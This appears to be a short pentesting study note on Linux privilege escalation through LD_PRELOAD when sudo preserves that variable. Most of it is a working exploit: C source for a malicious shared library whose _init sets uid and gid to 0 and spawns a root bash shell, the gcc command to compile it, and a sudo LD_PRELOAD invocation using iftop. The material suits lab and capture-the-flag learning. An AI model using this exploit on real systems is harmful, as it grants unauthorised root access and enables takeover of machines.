Pre-loading is a feature of LD (Dynamic Linker) which is available on most UNIX systems. This can be exploited by loading a custom library of our choice (as root) before loading a different library
```bash
sudo -l
```
![[Pasted image 20250214224416.png]]
Create a the malicious library in C
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init(){
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");
}	_
```

Code Breakdown:

- Including **standardio, sys/types** and **standard libraries**
- Unset the **LD_PRELOAD** environment variable
- Set the **gid** and **uid** to **0** (which is root)
- Then we want to execute **/bin/bash** as **root** (0)

Compile
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

Use LD_PRELOAD and another command that we can run as root
```bash
sudo LD_PRELOAD=/tmp/shell.so iftop
```